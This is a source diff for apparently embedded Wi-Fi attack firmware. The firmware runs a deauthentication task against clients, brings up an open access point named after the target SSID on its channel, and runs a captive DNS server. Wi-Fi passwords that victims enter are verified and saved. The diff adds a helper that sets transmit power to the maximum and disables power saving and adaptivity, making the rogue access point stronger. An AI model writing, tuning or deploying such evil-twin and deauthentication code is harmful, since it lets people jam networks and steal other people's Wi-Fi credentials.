+  return wext_private_command(ifname, buf, 0);
+}
+
+static void applyPerformanceSettings(void) {
+  agentSetTxPower("wlan0", 63);
+  agentSetTxPower("wlan1", 63);
+  wifi_disable_powersave();
+  wext_private_command("wlan0", "lps 0", 0);
+  wext_private_command("wlan0", "ips 0", 0);
+  wext_private_command("wlan0", "adaptivity_en 0", 0);
+  wext_private_command("wlan1", "adaptivity_en 0", 0);
+}
+
 void setup() {
 
   networks_mutex = xSemaphoreCreateMutex();
-
-  // BLE her görev içinde kendi init/begin/end döngüsünü yönetiyor
 
   FlashMemory.begin(FLASH_OFFSET, FLASH_BUF_SIZE);
   loadCredentials();
@@ -1580,7 +1508,7 @@ void setup() {
   wifi_start_ap((char *)AP_INITIAL_SSID, RTW_SECURITY_WPA2_AES_PSK, (char *)AP_INITIAL_PASS, strlen(AP_INITIAL_SSID), strlen(AP_INITIAL_PASS), 6);
   delay(800);
 
-  wifi_disable_powersave();
+  applyPerformanceSettings();
 
   ip4_addr_t ip, mask, gw;
   IP4_ADDR(&ip,   192, 168, 4, 1);
@@ -1628,6 +1556,8 @@ void loop() {
 
     delay(700);
 
+    applyPerformanceSettings();
+
     ip4_addr_t ip, mask, gw;
     IP4_ADDR(&ip,   192, 168, 4, 1);
     IP4_ADDR(&mask, 255, 255, 255, 0);
@@ -1643,8 +1573,6 @@ void loop() {
 
     dnsServer.begin();
     delay(150);
-
-    wifi_disable_powersave();
 
     uint8_t new_bssid[6];
     memset(new_bssid, 0, 6);
@@ -1690,6 +1618,9 @@ void loop() {
     wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
 
     delay(1200);
+
+    applyPerformanceSettings();
+
     netif_set_up(&xnetif[1]);
     netif_set_link_up(&xnetif[1]);
     delay(400);
@@ -1700,7 +1631,6 @@ void loop() {
     delay(700);
 
     dnsServer.begin();
-    wifi_disable_powersave();
     ap_running_channel = target_channel;
 
     delay(1000);
@@ -1716,21 +1646,21 @@ void loop() {
     saveCredentials(saved_ssid, saved_pass);
 
     deauth_active = false;
-    delay(50);  // 100'den 50'ye indirildi
+    delay(50);
 
-    conn_result = "ok"; 
+    conn_result = "ok";
     conn_status = CS_IDLE;
 
-    revert_time = millis() + 1500;  // 2000'den 1500'e indirildi - daha hızlı yönlendirme
+    revert_time = millis() + 1500;
 
   } else if (conn_status == CS_DONE_FAIL) {
-    sta_connected = false; 
-    conn_result = "fail"; 
+    sta_connected = false;
+    conn_result = "fail";
     conn_status = CS_IDLE;
 
     if (ap_switched) {
       deauth_active = false;
-      delay(50);  // 100'den 50'ye indirildi
+      delay(50);
       deauth_active = true;
       delay(500);
       xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
